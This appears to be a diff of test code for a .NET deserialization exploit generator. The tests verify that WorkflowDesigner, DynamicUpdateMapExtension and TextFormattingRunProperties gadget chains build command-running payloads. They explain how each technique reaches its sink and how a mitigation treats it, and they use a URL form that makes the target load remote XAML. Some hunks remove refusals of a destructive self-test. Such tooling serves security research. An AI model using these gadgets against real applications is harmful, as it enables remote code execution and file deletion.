+                        continue;
+
+                    // XAML never spells a CLR name in one piece: the bare type is the ELEMENT
+                    // and its namespace and assembly live in the xmlns. Every other format
+                    // here writes the assembly qualified name.
+                    bool namesTarget = formatter == "Xaml"
+                        ? text.IndexOf("<WorkflowDesigner ", StringComparison.Ordinal) >= 0
+                            && text.IndexOf("clr-namespace:System.Activities.Presentation", StringComparison.Ordinal) >= 0
+                        : text.IndexOf("System.Activities.Presentation.WorkflowDesigner", StringComparison.Ordinal) >= 0;
+                    if (!namesTarget)
+                        failures.Add(cell + " -> the payload does not name the target type");
+                    if (text.IndexOf("Surrogate", StringComparison.Ordinal) >= 0)
+                        failures.Add(cell + " -> a ysonet surrogate type name leaked into the payload");
+                    if (text.IndexOf("PropertyInspectorFontAndColorData", StringComparison.Ordinal) < 0)
+                        failures.Add(cell + " -> the payload does not name the member");
+                    // The inner document travels escaped for whichever literal it lands in, so
+                    // look for a token that survives every escaping this gadget applies.
+                    if (text.IndexOf("ObjectDataProvider", StringComparison.Ordinal) < 0)
+                        failures.Add(cell + " -> the inner XAML document is missing");
+                }
+            }
+            AssertTrue(failures.Count == 0,
+                "WorkflowDesigner generation cells failed (" + failures.Count + "):\n  "
+                    + string.Join("\n  ", failures.ToArray()));
+        }
+
+        // The gadget is a bridge CONSUMER: -bgc <xaml gadget> replaces the in-file default
+        // inner document. Both halves matter - the bridged payload must actually be used, and
+        // the default must still be there when no chain is given - so the test asserts they
+        // differ AND that each is the document it claims to be.
+        private static void WorkflowDesignerConsumesABridgedXamlPayload()
+        {
+            var g = GadgetRegistry.CreateGadgetInstance(WdGadget) as GenericGenerator;
+            AssertTrue(g != null, "the gadget loads");
+            AssertTrue(g.Labels().Contains(GadgetTags.Bridged), "it is tagged as a bridge consumer");
+            AssertEqual(Formatters.Xaml, g.SupportedBridgedFormatter(),
+                "and the inner payload is a Xaml document, because the sink is XamlReader.Load");
+
+            RunResult plain = GenerateWorkflowDesigner("Json.NET", false, "calc.exe");
+            AssertTrue(plain.Success, "the default inner payload builds: " + plain.ErrorMessage);
+            string plainText = (string)plain.Raw;
+            AssertTrue(plainText.IndexOf("ObjectType=", StringComparison.Ordinal) >= 0,
+                "the in-file default is the hand written ObjectType form: " + Truncate(plainText, 200));
+
+            InputArgs ia = new InputArgs();
+            ia.Cmd = "calc.exe";
+            ia.Test = false;
+            RunResult bridged = PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = WdGadget,
+                BridgedGadgetChain = "ObjectDataProvider",
+                FormatterName = "Json.NET",
+                OutputFormat = "",
+                InputArgs = ia,
+            });
+            AssertTrue(bridged.Success, "the bridged chain builds: " + bridged.ErrorMessage);
+            string bridgedText = (string)bridged.Raw;
+
+            AssertTrue(bridgedText != plainText,
+                "the bridged payload really replaced the default inner document");
+            // ObjectDataProvider's own Xaml payload serializes a LIVE graph, so it carries an
+            // ObjectInstance with a ProcessStartInfo. The in-file default never does.
+            AssertTrue(bridgedText.IndexOf("ObjectInstance", StringComparison.Ordinal) >= 0,
+                "and it is ObjectDataProvider's serialized graph: " + Truncate(bridgedText, 300));
+            AssertTrue(plainText.IndexOf("ObjectInstance", StringComparison.Ordinal) < 0,
+                "which the in-file default is not");
+        }
+
+        // -c is required for the DEFAULT inner payload and only for it: a bridged chain brings
+        // its own document, so refusing there would break the bridge.
+        private static void WorkflowDesignerRefusesOnlyWhatItCannotEmit()
+        {
+            RunResult empty = GenerateWorkflowDesigner("Json.NET", false, "");
+            AssertTrue(!empty.Success, "an empty -c is refused when there is no bridged payload");
+            AssertTrue(empty.ErrorMessage.IndexOf(WdGadget, StringComparison.Ordinal) >= 0,
+                "and the refusal names the gadget: " + empty.ErrorMessage);
+
+            RunResult unsupported = GenerateWorkflowDesigner("BinaryFormatter", false, "calc.exe");
+            AssertTrue(!unsupported.Success, "a formatter it never advertised is refused");
+        }
+
+        // The formatter list is a claim about a WRITE-ONLY member, so both directions are
+        // locked: what is advertised must be reachable, and the biggest exclusion must have a
+        // reproduced reason rather than an assumption.
+        private static void WorkflowDesignerAdvertisesWhatCanReachAWriteOnlyMember()
+        {
+            var g = GadgetRegistry.CreateGadgetInstance(WdGadget) as GenericGenerator;
+            AssertTrue(g != null, "the gadget loads");
+
+            List<string> advertised = g.SupportedFormatters();
+            AssertEqual(WorkflowDesignerFormatters.Length, advertised.Count,
+                "the fire/round-trip table covers every advertised formatter: "
+                    + string.Join(", ", advertised.ToArray()));
+            foreach (string[] row in WorkflowDesignerFormatters)
+                AssertTrue(advertised.Contains(row[0]), "the table names " + row[0]);
+
+            // YamlDotNet is the exclusion worth proving, because it is the one that fails for
+            // the WRITE-ONLY reason rather than a structural one: its deserializer inspects a
+            // type through a readable-properties inspector, which filters on CanRead, so the
+            // member is invisible to it and the key maps to nothing.
+            //
+            // Reproduced on a test-owned stand-in rather than on WorkflowDesigner itself -
+            // constructing the real target creates a WPF Application inside this runner, see
+            // the fire helper - and paired with a Json.NET control so the A/B is about the
+            // missing getter and nothing else. The assertion is on the ABSENCE OF THE
+            // ASSIGNMENT, not on an exception: whether YamlDotNet throws or silently assigns
+            // nothing is version-dependent, and only one of those two is worth relying on.
+            AssertTrue(!advertised.Contains(Formatters.YamlDotNet)
+                    && !advertised.Contains("YamlDotNet < 5.0.0"),
+                "YamlDotNet is not advertised");
+
+            const string yaml = @"
+!<!ysonet.Tests.WriteOnlyMemberProbe,ysonet.Tests> {
+    Assigned: ""from-yaml""
+}";
+            WriteOnlyMemberProbe.LastAssigned = null;
+            Exception yamlError = null;
+            object fromYaml = null;
+            try { fromYaml = SerializersHelper.YamlDotNet_deserialize(yaml); }
+            catch (Exception ex) { yamlError = ex; }
+            string yamlOutcome = yamlError != null
+                ? "it refused the document: " + yamlError.Message
+                : "it built " + (fromYaml == null ? "nothing" : fromYaml.GetType().Name)
+                    + " and assigned nothing, which is the SILENT failure";
+            AssertTrue(WriteOnlyMemberProbe.LastAssigned == null,
+                "YamlDotNet never assigns a write-only property (" + yamlOutcome + ")");
+            // Printed, not only asserted: which of the two ways it fails decides how the
+            // gadget's own comment has to describe the exclusion, and a future YamlDotNet
+            // could move from one to the other without this assertion noticing.
+            Console.Error.WriteLine("  [info] YamlDotNet vs a write-only member: " + yamlOutcome);
+
+            const string json = @"{
+    ""$type"":""ysonet.Tests.WriteOnlyMemberProbe, ysonet.Tests"",
+    ""Assigned"":""from-json""
+}";
+            WriteOnlyMemberProbe.LastAssigned = null;
+            SerializersHelper.JsonNet_deserialize(json);
+            AssertEqual("from-json", WriteOnlyMemberProbe.LastAssigned,
+                "while Json.NET does, which is what makes the exclusion about the getter");
+
+            // The runtime formatters are out for a second, independent reason: no attribute.
+            Type wd = Type.GetType(
+                "System.Activities.Presentation.WorkflowDesigner, System.Activities.Presentation, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+                false);
+            if (wd == null)
+            {
+                Console.Error.WriteLine("  [skip] WorkflowDesigner target shape: "
+                    + "System.Activities.Presentation is not available on this machine");
+                return;
+            }
+
+            AssertTrue(!wd.IsSerializable,
+                "WorkflowDesigner is not [Serializable], which rules out BinaryFormatter, "
+                    + "SoapFormatter, LosFormatter and FsPickler before any document shape matters");
+
+            // The shape the technique needs. A future framework that added a getter, made the
+            // constructor non-public, or renamed the member would make this gadget silently
+            // inert with nothing else failing.
+            AssertTrue(wd.IsPublic && !wd.IsAbstract, "the target type is public and constructible");
+            AssertTrue(wd.GetConstructor(Type.EmptyTypes) != null,
+                "and has a public parameterless constructor, which is what every advertised "
+                    + "formatter uses to create it");
+            System.Reflection.PropertyInfo sink = wd.GetProperty("PropertyInspectorFontAndColorData");
+            AssertTrue(sink != null, "the member still exists");
+            AssertEqual(typeof(string), sink.PropertyType, "and is still a string");
+            AssertTrue(!sink.CanRead,
+                "and is still WRITE ONLY, which is the whole reason the formatter list is short");
+            AssertTrue(sink.CanWrite, "with a setter, which is the sink");
+        }
+
+        // The metadata an operator searches on.
+        private static void WorkflowDesignerDeclaresItsFacets()
+        {
+            var g = GadgetRegistry.CreateGadgetInstance(WdGadget) as GenericGenerator;
+            AssertTrue(g != null, "the gadget loads");
+
+            AssertEqual(CommandInputType.ShellCommand, g.CommandInput(),
+                "-c is a command, which the INNER Xaml payload consumes");
+            AssertEqual(0, g.Variants().Count, "one payload shape");
+
+            GadgetFacetSet facets = g.Facets();
+            AssertTrue(facets.Kinds.Contains(PayloadKind.NestedDeserialization),
+                "the setter hands operator-controlled text to a second deserializer");
+            AssertTrue(facets.Kinds.Contains(PayloadKind.CodeExecution),
+                "and that deserializer builds whatever the document declares");
+
+            AssertTrue(facets.Requirements.Contains(GadgetRequirement.Wpf),
+                "the target constructs WPF objects and loads WPF markup");
+            AssertTrue(facets.Requirements.Contains(GadgetRequirement.BuiltIn),
+                "System.Activities.Presentation ships with the framework");
+
+            AssertTrue(!facets.Versions.Contains(RuntimeVersion.Unspecified),
+                "a runtime-gated gadget names at least one working version");
+            AssertTrue(facets.Versions.Contains(RuntimeVersion.NetFx481),
+                "4.8.1 is the build the effect was observed on");
+
+            AssertTrue(g.AdditionalInfo().IndexOf("XamlReader", StringComparison.OrdinalIgnoreCase) >= 0,
+                "AdditionalInfo names the sink");
+            AssertTrue(g.AdditionalInfo().IndexOf("STA", StringComparison.Ordinal) >= 0,
+                "and the STA requirement, which decides whether the payload lands at all");
+            AssertInfoPanelKeepsItsFacts(WdGadget);
+        }
+
+        // ---- DynamicUpdateMapExtension (XAML x:XData -> NetDataContractSerializer) ----------
+
+        private const string DumGadget = "DynamicUpdateMapExtension";
+
+        private static RunResult GenerateDynamicUpdateMapExtension(string formatter, bool minify, string cmd)
+        {
+            InputArgs ia = new InputArgs();
+            ia.Cmd = cmd;
+            ia.Test = false;
+            ia.Minify = minify;
+            return PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = DumGadget,
+                FormatterName = formatter,
+                OutputFormat = "",
+                InputArgs = ia,
+            });
+        }
+
+        // Generation, plus the two things a generation matrix cannot see: that the inner NDCS
+        // document really travels inside an x:XData section (the one detail the whole technique
+        // rests on), and that no XML declaration was carried into the middle of the document.
+        private static void DynamicUpdateMapExtensionCarriesTheInnerDocument()
+        {
+            var failures = new List<string>();
+            for (int m = 0; m < 2; m++)
+            {
+                bool minify = m == 1;
+                string cell = "Xaml" + (minify ? " (minified)" : "");
+                RunResult r = GenerateDynamicUpdateMapExtension("Xaml", minify, "calc.exe");
+                if (!r.Success || RawIsEmpty(r.Raw))
+                {
+                    failures.Add(cell + " -> " + (r.Success ? "empty" : r.ErrorMessage));
+                    continue;
+                }
+
+                string text = Text(r.Raw);
+
+                // XAML never spells a CLR name in one piece: the bare type is the ELEMENT and
+                // its namespace and assembly live in the xmlns.
+                if (text.IndexOf("<DynamicUpdateMapExtension", StringComparison.Ordinal) < 0
+                    || text.IndexOf("clr-namespace:System.Activities.XamlIntegration", StringComparison.Ordinal) < 0)
+                    failures.Add(cell + " -> the payload does not name the target type");
+                if (text.IndexOf("DynamicUpdateMapExtension.XmlContent", StringComparison.Ordinal) < 0)
+                    failures.Add(cell + " -> the payload does not name the content property");
+                // The load-bearing detail. Without this element the XAML scanner tries to
+                // resolve the NDCS document's root as a XAML type and never calls ReadXml.
+                if (text.IndexOf(":XData", StringComparison.Ordinal) < 0)
+                    failures.Add(cell + " -> the inner document is not inside an x:XData section");
+                // The inner payload itself: the default is TypeConfuseDelegate through NDCS.
+                // Matched WITHOUT namespace prefixes, because the minifier renames them (z: -> c:,
+                // and it drops the z:Type that FactoryType already implies).
+                if (text.IndexOf("DelegateSerializationHolder", StringComparison.Ordinal) < 0
+                    || text.IndexOf("SortedSet", StringComparison.Ordinal) < 0
+                    || text.IndexOf(":Type=", StringComparison.Ordinal) < 0)
+                    failures.Add(cell + " -> the inner NetDataContractSerializer document is missing");
+                // An XML declaration is only legal at the very start of a document, so one left
+                // on the inner payload would make the whole thing unparseable.
+                if (text.IndexOf("<?xml", StringComparison.Ordinal) >= 0)
+                    failures.Add(cell + " -> an XML declaration survived into the document");
+
+                // It has to be a real XML document, not merely a string with the right words.
+                try
+                {
+                    var doc = new System.Xml.XmlDocument { XmlResolver = null };
+                    doc.LoadXml(text);
+                }
+                catch (Exception ex)
+                {
+                    failures.Add(cell + " -> the payload is not well-formed XML: " + ex.Message);
+                }
+            }
+            AssertTrue(failures.Count == 0,
+                "DynamicUpdateMapExtension generation cells failed (" + failures.Count + "):\n  "
+                    + string.Join("\n  ", failures.ToArray()));
+        }
+
+        // The gadget is a bridge CONSUMER: -bgc <ndcs gadget> replaces the in-file default inner
+        // payload. Both halves matter - the bridged payload must actually be used, and the
+        // default must still be there when no chain is given.
+        private static void DynamicUpdateMapExtensionConsumesABridgedNdcsPayload()
+        {
+            var g = GadgetRegistry.CreateGadgetInstance(DumGadget) as GenericGenerator;
+            AssertTrue(g != null, "the gadget loads");
+            AssertTrue(g.Labels().Contains(GadgetTags.Bridged), "it is tagged as a bridge consumer");
+            AssertEqual(Formatters.NetDataContractSerializer, g.SupportedBridgedFormatter(),
+                "and the inner payload is an NDCS document, because the sink is "
+                    + "NetDataContractSerializer.ReadObject");
+
+            RunResult plain = GenerateDynamicUpdateMapExtension("Xaml", false, "calc.exe");
+            AssertTrue(plain.Success, "the default inner payload builds: " + plain.ErrorMessage);
+            string plainText = Text(plain.Raw);
+            AssertTrue(plainText.IndexOf("SortedSet", StringComparison.Ordinal) >= 0,
+                "the default inner payload is the TypeConfuseDelegate chain: "
+                    + Truncate(plainText, 200));
+
+            InputArgs ia = new InputArgs();
+            ia.Cmd = "calc.exe";
+            ia.Test = false;
+            RunResult bridged = PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = DumGadget,
+                BridgedGadgetChain = "TextFormattingRunProperties",
+                FormatterName = "Xaml",
+                OutputFormat = "",
+                InputArgs = ia,
+            });
+            AssertTrue(bridged.Success, "the bridged chain builds: " + bridged.ErrorMessage);
+            string bridgedText = Text(bridged.Raw);
+
+            AssertTrue(bridgedText != plainText,
+                "the bridged payload really replaced the default inner document");
+            AssertTrue(bridgedText.IndexOf("TextFormattingRunProperties", StringComparison.Ordinal) >= 0,
+                "and it is the chained gadget's NDCS document: " + Truncate(bridgedText, 300));
+            AssertTrue(bridgedText.IndexOf(":XData", StringComparison.Ordinal) >= 0,
+                "still wrapped in the x:XData section the sink needs");
+        }
+
+        // -c is required for the DEFAULT inner payload and only for it: a bridged chain brings
+        // its own document, so refusing there would break the bridge.
+        private static void DynamicUpdateMapExtensionRefusesOnlyWhatItCannotEmit()
+        {
+            RunResult empty = GenerateDynamicUpdateMapExtension("Xaml", false, "");
+            AssertTrue(!empty.Success, "an empty -c is refused when there is no bridged payload");
+            AssertTrue(empty.ErrorMessage.IndexOf(DumGadget, StringComparison.Ordinal) >= 0,
+                "and the refusal names the gadget: " + empty.ErrorMessage);
+
+            RunResult unsupported = GenerateDynamicUpdateMapExtension("BinaryFormatter", false, "calc.exe");
+            AssertTrue(!unsupported.Success, "a formatter it never advertised is refused");
+        }
+
+        /// <summary>
+        /// The structural proof, and the one experiment that was worth running twice: the inner
+        /// document reaches IXmlSerializable.ReadXml ONLY when it sits inside an x:XData section.
+        ///
+        /// Both documents below carry a BENIGN inner NDCS payload (a plain string), so nothing
+        /// executes here; what is measured is how far the XAML object writer gets.
+        ///   with x:XData    - the writer calls ReadXml, NetDataContractSerializer.ReadObject
+        ///                     builds our string, and the cast to DynamicUpdateMap then fails.
+        ///                     That InvalidCastException NAMES the object NDCS built, so it is
+        ///                     direct evidence that the inner deserializer ran on our document.
+        ///   without x:XData - the scanner treats the NDCS root as a XAML type to resolve, and
+        ///                     the load fails without ReadXml ever being called.
+        /// </summary>
+        private static void DynamicUpdateMapExtensionReachesReadXmlOnlyThroughXData()
+        {
+            const string aqn = "System.Activities.XamlIntegration.DynamicUpdateMapExtension, "
+                + "System.Activities, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35";
+            Type target = Type.GetType(aqn, false);
+            if (target == null)
+            {
+                Console.Error.WriteLine("  [skip] DynamicUpdateMapExtension target shape: "
+                    + "System.Activities is not available on this machine");
+                return;
+            }
+
+            // The shape the technique needs. A framework that gave XmlContent a setter, changed
+            // its type, or made the constructor non-public would leave this gadget inert with
+            // nothing else failing.
+            AssertTrue(target.IsPublic && !target.IsAbstract, "the target type is public and constructible");
+            AssertTrue(target.GetConstructor(Type.EmptyTypes) != null,
+                "and has a public parameterless constructor, which is what the XAML writer uses");
+            System.Reflection.PropertyInfo sink = target.GetProperty("XmlContent");
+            AssertTrue(sink != null, "the content property still exists");
+            AssertTrue(typeof(System.Xml.Serialization.IXmlSerializable).IsAssignableFrom(sink.PropertyType),
+                "and is still IXmlSerializable, which is what makes the XAML writer treat it as XData");
+            AssertTrue(sink.CanRead && !sink.CanWrite,
+                "it is READ ONLY, and that is fine here: the writer reads the lazily built value "
+                    + "and calls ReadXml on it instead of assigning anything");
+
+            // A harmless inner document, built by the same serializer the target uses.
+            string benignNdcs = SerializersHelper.NetDataContractSerializer_serialize("ysonet-xdata-probe");
+            int declEnd = benignNdcs.IndexOf("?>", StringComparison.Ordinal);
+            if (benignNdcs.TrimStart().StartsWith("<?xml", StringComparison.Ordinal) && declEnd >= 0)
+                benignNdcs = benignNdcs.Substring(declEnd + 2).Trim();
+
+            const string header = @"<DynamicUpdateMapExtension xmlns=""clr-namespace:System.Activities.XamlIntegration;assembly=System.Activities"" xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml"">
+  <DynamicUpdateMapExtension.XmlContent>";
+            const string footer = @"  </DynamicUpdateMapExtension.XmlContent>
+</DynamicUpdateMapExtension>";
+
+            string withXData = header + "<x:XData>" + benignNdcs + "</x:XData>" + footer;
+            string withoutXData = header + benignNdcs + footer;
+
+            Exception withError = LoadXamlAndCatch(withXData);
+            AssertTrue(withError != null,
+                "the x:XData form throws, because the loaded object cannot be a DynamicUpdateMap");
+            string withChain = ExceptionChainText(withError);
+            AssertTrue(withChain.IndexOf("DynamicUpdateMapExtension.XmlContent", StringComparison.Ordinal) >= 0,
+                "and the failure is the writer setting the xml instance, i.e. ReadXml ran: " + withChain);
+            AssertTrue(withChain.IndexOf("System.String", StringComparison.Ordinal) >= 0
+                    && withChain.IndexOf("DynamicUpdateMap", StringComparison.Ordinal) >= 0,
+                "on the object NetDataContractSerializer built from our document: " + withChain);
+
+            // The same document through System.Xaml's XamlServices, on this ordinary MTA thread.
+            // That reader is what XamlServices.Load / ActivityXamlServices.Load use, it pulls in
+            // no WPF, and reaching the same sink through it is the evidence behind this gadget
+            // NOT declaring GadgetRequirement.Wpf.
+            Exception systemXamlError = null;
+            try { System.Xaml.XamlServices.Parse(withXData); }
+            catch (Exception ex) { systemXamlError = ex; }
+            AssertTrue(systemXamlError != null,
+                "the non-WPF System.Xaml reader also throws on the cast");
+            string systemXamlChain = ExceptionChainText(systemXamlError);
+            AssertTrue(systemXamlChain.IndexOf("DynamicUpdateMapExtension.XmlContent", StringComparison.Ordinal) >= 0
+                    && systemXamlChain.IndexOf("DynamicUpdateMap", StringComparison.Ordinal) >= 0,
+                "and it reached ReadXml with no WPF and no STA thread: " + systemXamlChain);
+
+            // THE ONE PLACE THIS CARRIER DOES NOT LAND, measured rather than assumed. The
+            // CVE-2020-0605/0606 mitigation (XamlReader's RestrictiveXamlXmlReader, used by the
+            // WPF clipboard/XPS sinks) names five blocked types - ObjectDataProvider,
+            // ResourceDictionary, AssemblyInstaller, WorkflowDesigner, BindingSource - and it is
+            // tempting to conclude that a type absent from that list gets through. It does not:
+            // RestrictiveXamlXmlReader.IsRestrictedType is really an ALLOWLIST, keeping only a
+            // DependencyObject subclass whose namespace is System.Windows[.*], a primitive, or a
+            // registry/SerializationConfig-allowed type, and DROPPING every other subtree. So this
+            // gadget is skipped there with NO exception and NO effect. That silence is the point
+            // of the assertion: "it did not throw" must never be read as "it worked".
+            Exception restrictiveError = null;
+            object restrictiveResult = null;
+            bool restrictiveAvailable = true;
+            RunSTA(delegate
+            {
+                try { restrictiveResult = SerializersHelper.Xaml_deserialize_restrictive(withXData); }
+                catch (NotSupportedException) { restrictiveAvailable = false; }
+                catch (Exception ex) { restrictiveError = ex; }
+            });
+            if (!restrictiveAvailable)
+            {
+                Console.Error.WriteLine("  [skip] DynamicUpdateMapExtension vs the restrictive "
+                    + "XAML reader: this framework predates the CVE-2020-0605/0606 overload");
+            }
+            else
+            {
+                AssertTrue(restrictiveError == null,
+                    "the restrictive reader does not throw - it drops the subtree: "
+                        + ExceptionChainText(restrictiveError));
+                AssertTrue(restrictiveResult == null,
+                    "and it builds nothing, so ReadXml is never reached and the payload has no "
+                        + "effect on a restricted sink (got "
+                        + (restrictiveResult == null ? "null" : restrictiveResult.GetType().FullName) + ")");
+            }
+
+            Exception withoutError = LoadXamlAndCatch(withoutXData);
+            AssertTrue(withoutError != null,
+                "nesting the NDCS document directly under the property element does not load");
+            string withoutChain = ExceptionChainText(withoutError);
+            AssertTrue(withoutChain.IndexOf("DynamicUpdateMapExtension.XmlContent", StringComparison.Ordinal) < 0,
+                "and it fails BEFORE ReadXml, in XAML type resolution: " + withoutChain);
+            // Printed as well as asserted: this is the exact mistake the technique invites, so
+            // the message it produces is worth having in the log.
+            Console.Error.WriteLine("  [info] DynamicUpdateMapExtension without x:XData: "
+                + Truncate(withoutChain, 200));
+        }
+
+        // Load a XAML document on an STA thread and return whatever it threw (null when it
+        // loaded). The WPF parser is what every advertised target sink ends up using here.
+        private static Exception LoadXamlAndCatch(string xaml)
+        {
+            Exception caught = null;
+            RunSTA(delegate
+            {
+                try { SerializersHelper.Xaml_deserialize(xaml); }
+                catch (Exception ex) { caught = ex; }
+            });
+            return caught;
+        }
+
+        private static string ExceptionChainText(Exception ex)
+        {
+            var sb = new StringBuilder();
+            for (Exception e = ex; e != null; e = e.InnerException)
+                sb.Append('[').Append(e.GetType().Name).Append("] ").Append(e.Message).Append(' ');
+            return sb.ToString();
+        }
+
+        // The metadata an operator searches on.
+        private static void DynamicUpdateMapExtensionDeclaresItsFacets()
+        {
+            var g = GadgetRegistry.CreateGadgetInstance(DumGadget) as GenericGenerator;
+            AssertTrue(g != null, "the gadget loads");
+
+            AssertEqual(CommandInputType.ShellCommand, g.CommandInput(),
+                "-c is a command, which the INNER NDCS payload consumes");
+            AssertEqual(0, g.Variants().Count, "one payload shape");
+
+            List<string> advertised = g.SupportedFormatters();
+            AssertEqual(1, advertised.Count,
+                "Xaml is the only formatter, because the sink is a XAML parser feature: "
+                    + string.Join(", ", advertised.ToArray()));
+            AssertEqual(Formatters.Xaml, advertised[0], "and that formatter is Xaml");
+
+            GadgetFacetSet facets = g.Facets();
+            AssertTrue(facets.Kinds.Contains(PayloadKind.NestedDeserialization),
+                "the XAML document hands its content to a second deserializer");
+            AssertTrue(facets.Kinds.Contains(PayloadKind.CodeExecution),
+                "and the default inner chain runs a command");
+            AssertTrue(facets.Requirements.Contains(GadgetRequirement.BuiltIn),
+                "System.Activities ships with the framework");
+            AssertTrue(!facets.Requirements.Contains(GadgetRequirement.Wpf),
+                "and WPF is NOT required - DynamicUpdateMapExtensionReachesReadXmlOnlyThroughXData "
+                    + "reaches the same sink through System.Xaml's XamlServices on an MTA thread");
+
+            AssertTrue(!facets.Versions.Contains(RuntimeVersion.Unspecified),
+                "a runtime-gated gadget names at least one working version");
+            AssertTrue(facets.Versions.Contains(RuntimeVersion.NetFx481),
+                "4.8.1 is the build the effect was observed on");
+            AssertTrue(!facets.Versions.Contains(RuntimeVersion.NetFx40),
+                "4.0 is excluded: System.Activities.DynamicUpdate arrived in 4.5");
+
+            AssertTrue(g.AdditionalInfo().IndexOf("NetDataContractSerializer", StringComparison.Ordinal) >= 0,
+                "AdditionalInfo names the inner serializer");
+            AssertTrue(g.AdditionalInfo().IndexOf("XData", StringComparison.Ordinal) >= 0,
+                "and the x:XData section the payload depends on");
+            AssertInfoPanelKeepsItsFacts(DumGadget);
+        }
+
+        // TextFormattingRunProperties' --xamlurl used to steer ObjectDataProvider onto variant
+        // 3. It now carries the ResourceDictionary gadget instead, and the SharePoint plugin's
+        // --useurl mode rides the same path. The payload the target sees is unchanged, which
+        // is the point of the rewire.
+        private static void TextFormattingRunPropertiesXamlUrlCarriesResourceDictionary()
+        {
+            const string url = "http://127.0.0.1:8080/x.xaml";
+
+            InputArgs ia = new InputArgs();
+            ia.Cmd = "calc.exe"; // ignored when --xamlurl is given
+            ia.Test = false;
+            ia.ExtraArguments = new List<string> { "--xamlurl", url };
+            RunResult urlForm = PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = "TextFormattingRunProperties",
+                FormatterName = "BinaryFormatter",
+                OutputFormat = "",
+                InputArgs = ia,
+            });
+            AssertTrue(urlForm.Success, "the URL form generates: " + urlForm.ErrorMessage);
+
+            string carried = Encoding.UTF8.GetString(Bytes(urlForm.Raw));
+            AssertTrue(carried.IndexOf("ResourceDictionary", StringComparison.Ordinal) >= 0
+                    && carried.IndexOf("Source=\"" + url + "\"", StringComparison.Ordinal) >= 0,
+                "and carries the ResourceDictionary document with the URL in Source");
+            AssertTrue(carried.IndexOf("ObjectDataProvider", StringComparison.Ordinal) < 0,
+                "and nothing of the command chain, because the URL form replaces it");
+
+            // Without the option the gadget is unchanged: still ObjectDataProvider.
+            InputArgs plainArgs = new InputArgs();
+            plainArgs.Cmd = "calc.exe";
+            plainArgs.Test = false;
+            RunResult commandForm = PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = "TextFormattingRunProperties",
+                FormatterName = "BinaryFormatter",
+                OutputFormat = "",
+                InputArgs = plainArgs,
+            });
+            AssertTrue(commandForm.Success, "the command form generates: " + commandForm.ErrorMessage);
+            string plain = Encoding.UTF8.GetString(Bytes(commandForm.Raw));
+            AssertTrue(plain.IndexOf("ObjectDataProvider", StringComparison.Ordinal) >= 0,
+                "and still carries ObjectDataProvider");
+        }
+
         // ---- WSManPluginInstance (denial of service) ----------------------------
         //
         // NOTHING HERE DESERIALIZES THE PAYLOAD, in any tier and in any process. That is the
@@ -6819,12 +9172,20 @@ namespace ysonet.Tests
         // -t deserializes the payload in THIS process, which for this gadget means loading
         // the operator's DLL and running its installer constructors on the operator's own
         // machine. It must refuse, and it must refuse BEFORE it does anything with the path.
-        private static void AssemblyInstallerLoadRefusesSelfTest()
+        // -t in ysonet is a self-exploit: it deserializes the payload HERE, which loads the
+        // operator's DLL and runs its installer constructors on THIS machine - the same thing
+        // -t on ObjectDataProvider does when it runs the -c command here. So it is ACCEPTED,
+        // not refused. The DLL path used here does NOT exist, so the self-test's LoadFrom
+        // throws and RunSelfTest swallows it: nothing is loaded, and what is proved is only
+        // that the refusal is gone and generation still succeeds. (The installer really
+        // running on deserialize is proved by FireAssemblyInstallerLoad against the test's
+        // own fixture assembly.)
+        private static void AssemblyInstallerLoadAcceptsSelfTest()
         {
             foreach (string formatter in AiFormatters)
             {
                 InputArgs ia = new InputArgs();
-                ia.Cmd = AiLocalDll;
+                ia.Cmd = AiLocalDll; // nonexistent: the self-test load is swallowed
                 ia.Test = true;
                 RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
                 {
@@ -6833,26 +9194,25 @@ namespace ysonet.Tests
                     OutputFormat = "",
                     InputArgs = ia,
                 });
-                AssertTrue(!r.Success, formatter + ": -t is refused");
-                AssertTrue((r.ErrorMessage ?? "").IndexOf("refuses -t", StringComparison.Ordinal) >= 0,
-                    formatter + ": the refusal says so plainly: " + r.ErrorMessage);
-            }
+                AssertTrue(r.Success, formatter + ": -t is accepted as a self-exploit: " + r.ErrorMessage);
+                AssertTrue((r.ErrorMessage ?? "").IndexOf("refuses -t", StringComparison.Ordinal) < 0,
+                    formatter + ": no -t refusal remains: " + r.ErrorMessage);
 
-            // Refused BEFORE the path is looked at: an input that would fail validation
-            // still comes back with the -t refusal, which is the ordering proof.
-            InputArgs bad = new InputArgs();
-            bad.Cmd = "";
-            bad.Test = true;
-            RunResult ordering = PayloadRunner.GenerateGadget(new GenerationRequest
-            {
-                GadgetName = AiGadget,
-                FormatterName = "Json.NET",
-                OutputFormat = "",
-                InputArgs = bad,
-            });
-            AssertTrue(!ordering.Success, "still refuses with an empty -c");
-            AssertTrue((ordering.ErrorMessage ?? "").IndexOf("refuses -t", StringComparison.Ordinal) >= 0,
-                "-t is refused before the input is even validated: " + ordering.ErrorMessage);
+                // The payload it ships under -t is the same one it ships without it: -t only
+                // adds the local deserialize, it does not change the bytes.
+                InputArgs plain = new InputArgs();
+                plain.Cmd = AiLocalDll;
+                plain.Test = false;
+                RunResult untested = PayloadRunner.GenerateGadget(new GenerationRequest
+                {
+                    GadgetName = AiGadget,
+                    FormatterName = formatter,
+                    OutputFormat = "",
+                    InputArgs = plain,
+                });
+                AssertEqual(Convert.ToString(untested.Raw), Convert.ToString(r.Raw),
+                    formatter + ": -t ships the same payload it self-tested");
+            }
         }
 
         // Building a payload must never load the DLL. The fixture installer writes a marker
@@ -6962,30 +9322,60 @@ namespace ysonet.Tests
         // deserialize: a self-test here would build a real TempFileCollection holding the
         // operator's paths inside ysonet.exe and let its finalizer delete them. The proof is
         // a real file that is still there afterwards, plus a forced collection in between.
-        private static void TempFileCollectionRefusesSelfTest()
+        // -t in ysonet is a self-exploit, and for this gadget it is genuinely destructive
+        // (the maintainer's call): -t deserializes the payload HERE, arming the real
+        // TempFileCollection's finalizer, which DELETES the paths in -c on this machine. So
+        // -t is ACCEPTED, not refused. Everything here stays inside the test's own artifact
+        // directory.
+        private static void TempFileCollectionAcceptsSelfTest()
         {
-            string victim = WriteTestArtifact("ysonet_tfc_selftest_victim.txt", "must survive -t");
